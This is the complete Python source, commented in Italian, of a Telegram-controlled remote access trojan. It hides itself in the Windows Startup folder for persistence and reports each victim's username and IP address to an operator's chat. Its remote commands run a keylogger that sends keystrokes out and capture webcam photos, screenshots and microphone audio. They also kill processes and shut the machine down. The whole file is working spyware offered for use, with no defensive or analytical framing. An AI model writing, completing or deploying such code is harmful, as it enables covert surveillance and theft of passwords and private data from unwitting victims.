import telebot
from pynput import keyboard
import threading
import os
import platform
import socket
import psutil
import sys
import shutil
import subprocess
from datetime import datetime
import ctypes  # Per il pop-up su Windows e cambiare lo sfondo
import tkinter as tk  # Per il pop-up su Linux/macOS
from tkinter import messagebox
import cv2  # Per la webcam
from PIL import ImageGrab  # Per lo screenshot
import requests  # Per scaricare immagini da URL
import pyaudio  # Per la registrazione audio
import wave  # Per salvare l'audio in un file

# Configurazione del bot Telegram
TOKEN = 'YOUR TOKEN'  # Sostituisci con il token del tuo bot
CHAT_ID = 'YOUR CHATID'  # Sostituisci con il tuo chat ID
bot = telebot.TeleBot(TOKEN)

# Variabile per memorizzare i tasti premuti
logged_keys = []

# Flag per controllare se il keylogger è attivo
keylogger_active = False

# Oggetto listener della tastiera
listener = None

# Percorso della cartella di avvio automatico
STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# Dizionario per memorizzare gli utenti attivi
active_users = {}

# Variabili per la registrazione audio
audio_frames = []
audio_stream = None
audio_p = None
is_recording = False


# Funzione per generare un ID incrementale (PC1, PC2, PC3, ...)
def get_next_id():
    # Trova il numero più alto tra gli ID esistenti
    max_id = 0
    for unique_id in active_users.keys():
        if unique_id.startswith("PC"):
            try:
                current_id = int(unique_id[2:])  # Estrae il numero da "PC1", "PC2", ecc.
                if current_id > max_id:
                    max_id = current_id
            except ValueError:
                continue
    return f"PC{max_id + 1}"  # Restituisce il prossimo ID disponibile


# Funzione per generare un identificatore unico per ogni istanza
def get_unique_identifier():
    return get_next_id()


# Funzione per inviare un messaggio all'avvio
def send_startup_message():
    current_date = datetime.now().strftime("%d/%m/%Y")
    current_time = datetime.now().strftime("%H:%M:%S")
    username = get_windows_username()
    ip_address = socket.gethostbyname(socket.gethostname())
    unique_id = get_unique_identifier()

    # Aggiungi l'utente alla lista degli utenti attivi
    active_users[unique_id] = {
        'username': username,
        'ip_address': ip_address,
        'start_time': f"{current_date} {current_time}"
    }

    # Crea il messaggio
    message = f"🟢 Il programma è stato avviato.\n\n📅 Data: {current_date}\n⏰ Ora: {current_time}\n👤 Nome utente: {username}\n🌐 Indirizzo IP: {ip_address}\n🆔 ID: {unique_id}"
    # Invia il messaggio al bot
    bot.send_message(CHAT_ID, message)


# Funzione per spostare il file nella cartella di avvio automatico e nasconderlo
def move_to_startup():
    script_path = sys.argv[0]
    script_name = os.path.basename(script_path)
    destination_path = os.path.join(STARTUP_FOLDER, script_name)

    if os.path.dirname(script_path) == STARTUP_FOLDER:
        print("Il file è già nella cartella di avvio.")
        return

    if not os.path.exists(STARTUP_FOLDER):
        os.makedirs(STARTUP_FOLDER)

    shutil.move(script_path, destination_path)
    os.system(f"attrib +h {destination_path}")
    subprocess.Popen([destination_path], shell=True)
    sys.exit()


# Funzione per inviare i dati al bot Telegram
def send_logged_keys():
    if logged_keys:
        message = "Tasti premuti:\n" + "".join(logged_keys)
        bot.send_message(CHAT_ID, message)
        logged_keys.clear()


# Funzione chiamata quando un tasto viene premuto
def on_press(key):
    try:
        logged_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.enter:
            logged_keys.append("\n")
            send_logged_keys()
        elif key == keyboard.Key.space:
            logged_keys.append(" ")
        elif key == keyboard.Key.backspace:
            if logged_keys:
                logged_keys.pop()


# Funzione per avviare il keylogger
def start_keylogger():
    global listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


# Funzione per ottenere il nome utente di Windows
def get_windows_username():
    return os.getlogin()


# Funzione per raccogliere informazioni di sistema (infopc)
def get_system_info():
    current_date = datetime.now().strftime("%d/%m/%Y")
    current_time = datetime.now().strftime("%H:%M:%S")
    username = get_windows_username()
    ip_address = socket.gethostbyname(socket.gethostname())
    unique_id = get_unique_identifier()

    info = f"📊 **Informazioni del PC**\n\n"
    info += f"📅 Data: {current_date}\n"
    info += f"⏰ Ora: {current_time}\n"
    info += f"👤 Nome utente: {username}\n"
    info += f"🌐 Indirizzo IP: {ip_address}\n"
    info += f"🆔 ID: {unique_id}\n"
    return info


# Funzione per ottenere la directory del file eseguibile (infofile)
def get_file_directory():
    script_path = sys.argv[0]
    return f"📂 **Directory del file eseguibile:**\n{os.path.dirname(script_path)}"


# Funzione per ottenere i task in esecuzione (esclusi i processi di sistema)
def get_running_tasks():
    system_dirs = ["C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)"]
    tasks = []

    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            # Ottieni il percorso dell'eseguibile
            exe_path = proc.info['exe']
            if exe_path:
                # Escludi i processi di sistema
                if not any(exe_path.startswith(dir) for dir in system_dirs):
                    tasks.append(f"📌 {proc.info['name']} (PID: {proc.info['pid']})")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

    if not tasks:
        return "Nessun task in esecuzione (esclusi i processi di sistema)."
    return "📋 **Task in esecuzione:**\n" + "\n".join(tasks)


# Funzione per mostrare un pop-up
def show_popup(message):
    if platform.system() == "Windows":
        # Usa ctypes per mostrare un pop-up su Windows
        ctypes.windll.user32.MessageBoxW(0, message, "Popup Remoto", 0x40 | 0x1000)
    else:
        # Usa tkinter per mostrare un pop-up su Linux/macOS
        root = tk.Tk()
        root.withdraw()  # Nasconde la finestra principale di tkinter
        messagebox.showinfo("Popup Remoto", message)
        root.destroy()


# Funzione per catturare un'immagine dalla webcam
def capture_webcam():
    # Apre la webcam
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None

    # Cattura un frame
    ret, frame = cap.read()
    if not ret:
        return None

    # Rilascia la webcam
    cap.release()

    # Salva l'immagine in un file temporaneo
    temp_file = "webcam_capture.jpg"
    cv2.imwrite(temp_file, frame)
    return temp_file


# Funzione per catturare uno screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    temp_file = "screenshot.png"
    screenshot.save(temp_file)
    return temp_file


# Funzione per cambiare lo sfondo del desktop
def change_wallpaper(image_url):
    try:
        # Scarica l'immagine dall'URL
        response = requests.get(image_url)
        if response.status_code == 200:
            temp_file = "wallpaper.jpg"
            with open(temp_file, "wb") as f:
                f.write(response.content)

            # Cambia lo sfondo su Windows
            if platform.system() == "Windows":
                ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(temp_file), 0)
                return True, "Sfondo cambiato con successo."
            else:
                return False, "Cambio sfondo non supportato su questo sistema operativo."
        else:
            return False, "Errore durante il download dell'immagine."
    except Exception as e:
        return False, f"Errore: {str(e)}"


# Funzione per avviare la registrazione audio
def start_recording_audio():
    global audio_frames, audio_stream, audio_p, is_recording
    audio_frames = []
    audio_p = pyaudio.PyAudio()
    audio_stream = audio_p.open(format=pyaudio.paInt16,
                                channels=1,
                                rate=44100,
                                input=True,
                                frames_per_buffer=1024)
    is_recording = True
    while is_recording:
        data = audio_stream.read(1024)
        audio_frames.append(data)


# Funzione per fermare la registrazione audio e salvare il file
def stop_recording_audio():
    global audio_frames, audio_stream, audio_p, is_recording
    if is_recording:
        is_recording = False
        audio_stream.stop_stream()
        audio_stream.close()
        audio_p.terminate()

        # Salva l'audio in un file WAV
        temp_file = "recording.wav"
        wf = wave.open(temp_file, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(audio_p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(audio_frames))
        wf.close()
        return temp_file
    return None


# Funzione per terminare il processo corrente
def panic():
    pid = os.getpid()
    if platform.system() == "Windows":
        os.system(f"taskkill /PID {pid} /F")
    else:
        os.system(f"kill -9 {pid}")


# Funzione per terminare un processo specifico
def terminate_process(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            try:
                proc.terminate()
                return True, f"Il processo {process_name} (PID: {proc.info['pid']}) è stato terminato."
            except psutil.NoSuchProcess:
                return False, f"Il processo {process_name} non è stato trovato."
            except psutil.AccessDenied:
                return False, f"Permessi insufficienti per terminare il processo {process_name}."
    return False, f"Il processo {process_name} non è in esecuzione."


# Funzione per spegnere il computer
def shutdown_computer():
    if platform.system() == "Windows":
        os.system("shutdown /s /t 0")
    else:
        os.system("shutdown -h now")


# Funzione per generare il messaggio di help
def generate_help_message():
    help_message = """
📋 **Lista Comandi e Stato**
/startlog 🟢 READY
/stoplog 🟢 READY
/infopc 🟢 READY
/infofile 🟢 READY
/rtask 🟢 READY
/popup 🟢 READY
/webcam 🟢 READY
/screenshot 🟢 READY
/changewp 🟢 READY
/startrecaudio 🟢 READY
/stoprecaudio 🟢 READY
/panic 🟢 READY
/taskkill 🟢 READY
/shutdown 🟢 READY
/users 🟢 READY
/selectuser 🟢 READY
/help 🟢 READY

🟢 READY: Comando funzionante
🟡 PROGRESS: Comando in sviluppo
🔴 DONT WORK: Comando non funzionante
"""
    return help_message


# Funzione per mostrare la lista degli utenti attivi
def show_active_users():
    if not active_users:
        return "Nessun utente attivo."
    users_list = "👥 **Utenti Attivi**\n"
    for unique_id, user_info in active_users.items():
        users_list += f"- 👤 {user_info['username']} | 🌐 {user_info['ip_address']} | 🆔 {unique_id}\n"
    return users_list


# Funzione per selezionare un utente specifico
def select_user(unique_id):
    if unique_id in active_users:
        return f"Utente selezionato: {active_users[unique_id]['username']} (ID: {unique_id})"
    else:
        return f"Utente con ID {unique_id} non trovato."


# Gestore del comando /popup
@bot.message_handler(commands=['popup'])
def handle_popup(message):
    # Estrae il messaggio dal comando (es. /popup Ciao Mondo!)
    popup_message = message.text.replace('/popup', '').strip()
    if popup_message:
        show_popup(popup_message)
        bot.reply_to(message, f"Popup inviato: {popup_message}")
    else:
        bot.reply_to(message, "Errore: Devi specificare un messaggio. Esempio: /popup Ciao Mondo!")


# Gestore del comando /webcam
@bot.message_handler(commands=['webcam'])
def handle_webcam(message):
    # Cattura l'immagine dalla webcam
    image_path = capture_webcam()
    if image_path:
        # Invia l'immagine al bot
        with open(image_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        # Elimina il file temporaneo
        os.remove(image_path)
    else:
        bot.reply_to(message, "Errore: Impossibile accedere alla webcam.")


# Gestore del comando /screenshot
@bot.message_handler(commands=['screenshot'])
def handle_screenshot(message):
    # Cattura lo screenshot
    screenshot_path = capture_screenshot()
    if screenshot_path:
        # Invia lo screenshot al bot
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        # Elimina il file temporaneo
        os.remove(screenshot_path)
    else:
        bot.reply_to(message, "Errore: Impossibile catturare lo screenshot.")


# Gestore del comando /changewp
@bot.message_handler(commands=['changewp'])
def handle_changewp(message):
    # Estrae l'URL dell'immagine dal comando (es. /changewp https://example.com/wallpaper.jpg)
    image_url = message.text.replace('/changewp', '').strip()
    if image_url:
        success, response = change_wallpaper(image_url)
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "Errore: Devi specificare un URL. Esempio: /changewp https://example.com/wallpaper.jpg")


# Gestore del comando /startrecaudio
@bot.message_handler(commands=['startrecaudio'])
def handle_startrecaudio(message):
    global is_recording
    if not is_recording:
        threading.Thread(target=start_recording_audio, daemon=True).start()
        bot.reply_to(message, "Registrazione audio avviata.")
    else:
        bot.reply_to(message, "La registrazione audio è già in corso.")


# Gestore del comando /stoprecaudio
@bot.message_handler(commands=['stoprecaudio'])
def handle_stoprecaudio(message):
    global is_recording
    if is_recording:
        audio_path = stop_recording_audio()
        if audio_path:
            # Invia il file audio al bot
            with open(audio_path, 'rb') as audio:
                bot.send_audio(message.chat.id, audio)
            # Elimina il file temporaneo
            os.remove(audio_path)
        bot.reply_to(message, "Registrazione audio fermata e inviata.")
    else:
        bot.reply_to(message, "Nessuna registrazione audio in corso.")


# Gestore dei messaggi per avviare/fermare il keylogger, richiedere informazioni, PANIC, TASKKILL, SHUTDOWN, USERS, SELECTUSER e HELP
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    global keylogger_active, listener

    if message.text.strip().upper() == "/STARTLOG":
        if not keylogger_active:
            keylogger_active = True
            username = get_windows_username()
            unique_id = get_unique_identifier()
            threading.Thread(target=start_keylogger, daemon=True).start()
            bot.reply_to(message, f"Keylogger avviato. Nome utente: {username}. ID: {unique_id}")
        else:
            bot.reply_to(message, "Il keylogger è già attivo.")

    elif message.text.strip().upper() == "/STOPLOG":
        if keylogger_active:
            keylogger_active = False
            if listener:
                listener.stop()
            bot.reply_to(message, "Keylogger fermato.")
        else:
            bot.reply_to(message, "Il keylogger non è attivo.")

    elif message.text.strip().upper() == "/INFOPC":
        system_info = get_system_info()
        bot.reply_to(message, system_info, parse_mode="Markdown")

    elif message.text.strip().upper() == "/INFOFILE":
        file_directory = get_file_directory()
        bot.reply_to(message, file_directory, parse_mode="Markdown")

    elif message.text.strip().upper() == "/RTASK":
        running_tasks = get_running_tasks()
        bot.reply_to(message, running_tasks, parse_mode="Markdown")

    elif message.text.strip().upper() == "/PANIC":
        bot.reply_to(message, "Avvio modalità PANIC. Terminazione del processo in corso...")
        panic()

    elif message.text.strip().upper().startswith("/TASKKILL"):
        parts = message.text.strip().split()
        if len(parts) == 2:
            process_name = parts[1]
            success, response = terminate_process(process_name)
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, "Formato comando non valido. Usa: /taskkill <nome_processo>")

    elif message.text.strip().upper() == "/SHUTDOWN":
        bot.reply_to(message, "Spegnimento del computer in corso...")
        shutdown_computer()

    elif message.text.strip().upper() == "/USERS":
        users_message = show_active_users()
        bot.reply_to(message, users_message)

    elif message.text.strip().upper().startswith("/SELECTUSER"):
        parts = message.text.strip().split()
        if len(parts) == 2:
            unique_id = parts[1]
            response = select_user(unique_id)
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, "Formato comando non valido. Usa: /selectuser <unique_id>")

    elif message.text.strip().upper() == "/HELP":
        help_message = generate_help_message()
        bot.reply_to(message, help_message, parse_mode="Markdown")

    else:
        bot.reply_to(message, "Comando non riconosciuto. Usa /help per vedere la lista dei comandi.")


# Sposta il file nella cartella di avvio automatico
move_to_startup()

# Invia un messaggio all'avvio
send_startup_message()

# Avvia il bot Telegram
print("In attesa di comandi... Usa /help per vedere la lista dei comandi.")
bot.polling()
